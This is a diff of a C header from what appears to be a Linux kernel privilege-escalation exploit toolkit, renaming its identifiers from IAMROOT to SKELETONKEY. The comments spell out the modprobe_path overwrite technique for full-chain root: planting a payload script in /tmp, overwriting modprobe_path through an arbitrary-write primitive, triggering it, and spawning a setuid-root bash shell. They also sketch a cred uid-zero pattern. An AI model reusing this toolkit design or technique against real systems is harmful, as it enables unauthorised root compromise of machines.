@@ -1,5 +1,5 @@
 /*
- * IAMROOT — shared finisher helpers for full-chain root pops.
+ * SKELETONKEY — shared finisher helpers for full-chain root pops.
  *
  * The 🟡 PRIMITIVE modules each land a kernel-side primitive (heap-OOB
  * write, slab UAF, etc.). The conversion to root is almost always one
@@ -21,11 +21,11 @@
  * Pattern (B) needs a self-cred chase + multiple writes.
  *
  * Modules provide their own arb-write primitive via the
- * iamroot_arb_write_fn callback; this file wraps the rest.
+ * skeletonkey_arb_write_fn callback; this file wraps the rest.
  */
 
-#ifndef IAMROOT_FINISHER_H
-#define IAMROOT_FINISHER_H
+#ifndef SKELETONKEY_FINISHER_H
+#define SKELETONKEY_FINISHER_H
 
 #include <stdint.h>
 #include <stddef.h>
@@ -35,7 +35,7 @@
 /* Arb-write primitive: write `len` bytes from `buf` to kernel VA
  * `kaddr`. Module-specific implementation. Returns 0 on success,
  * negative on failure. `ctx` is opaque module state. */
-typedef int (*iamroot_arb_write_fn)(uintptr_t kaddr,
+typedef int (*skeletonkey_arb_write_fn)(uintptr_t kaddr,
                                     const void *buf, size_t len,
                                     void *ctx);
 
@@ -43,22 +43,22 @@ typedef int (*iamroot_arb_write_fn)(uintptr_t kaddr,
  * groomed slab THEN call the trigger. The trigger is a separate fn
  * because some modules need to re-spray before each write. NULL is
  * acceptable if the arb-write is self-contained. */
-typedef int (*iamroot_fire_trigger_fn)(void *ctx);
+typedef int (*skeletonkey_fire_trigger_fn)(void *ctx);
 
 /* Pattern A: modprobe_path overwrite + execve trigger. Caller has
  * already populated `off->modprobe_path`. Implementation:
- *   1. Write payload script to /tmp/iamroot-mp-<pid>
- *   2. arb_write(off->modprobe_path, "/tmp/iamroot-mp-<pid>", 24)
- *   3. Write unknown-format file to /tmp/iamroot-trig-<pid>
+ *   1. Write payload script to /tmp/skeletonkey-mp-<pid>
+ *   2. arb_write(off->modprobe_path, "/tmp/skeletonkey-mp-<pid>", 24)
+ *   3. Write unknown-format file to /tmp/skeletonkey-trig-<pid>
  *   4. chmod +x both, execve() the trigger → kernel-call-modprobe
- *      → our payload runs as root → payload writes /tmp/iamroot-pwn
+ *      → our payload runs as root → payload writes /tmp/skeletonkey-pwn
  *      and/or copies /bin/bash to /tmp with setuid root
  *   5. Wait for sentinel file, exec'd the setuid-bash → root shell
  *
- * Returns IAMROOT_EXPLOIT_OK if we got a root shell back (verified
- * via geteuid() == 0), IAMROOT_EXPLOIT_FAIL otherwise. */
-int iamroot_finisher_modprobe_path(const struct iamroot_kernel_offsets *off,
-                                   iamroot_arb_write_fn arb_write,
+ * Returns SKELETONKEY_EXPLOIT_OK if we got a root shell back (verified
+ * via geteuid() == 0), SKELETONKEY_EXPLOIT_FAIL otherwise. */
+int skeletonkey_finisher_modprobe_path(const struct skeletonkey_kernel_offsets *off,
+                                   skeletonkey_arb_write_fn arb_write,
                                    void *arb_ctx,
                                    bool spawn_shell);
 
@@ -67,14 +67,14 @@ int iamroot_finisher_modprobe_path(const struct iamroot_kernel_offsets *off,
  *   1. Walk task linked list from init_task to find self by pid
  *      (this requires arb-READ too — not supplied here; B-pattern
  *      modules need to provide their own variant)
- * For now this is a STUB returning IAMROOT_EXPLOIT_FAIL with a
+ * For now this is a STUB returning SKELETONKEY_EXPLOIT_FAIL with a
  * helpful error. */
-int iamroot_finisher_cred_uid_zero(const struct iamroot_kernel_offsets *off,
-                                   iamroot_arb_write_fn arb_write,
+int skeletonkey_finisher_cred_uid_zero(const struct skeletonkey_kernel_offsets *off,
+                                   skeletonkey_arb_write_fn arb_write,
                                    void *arb_ctx,
                                    bool spawn_shell);
 
 /* Diagnostic: tell the operator how to populate offsets manually. */
-void iamroot_finisher_print_offset_help(const char *module_name);
+void skeletonkey_finisher_print_offset_help(const char *module_name);
 
-#endif /* IAMROOT_FINISHER_H */
+#endif /* SKELETONKEY_FINISHER_H */
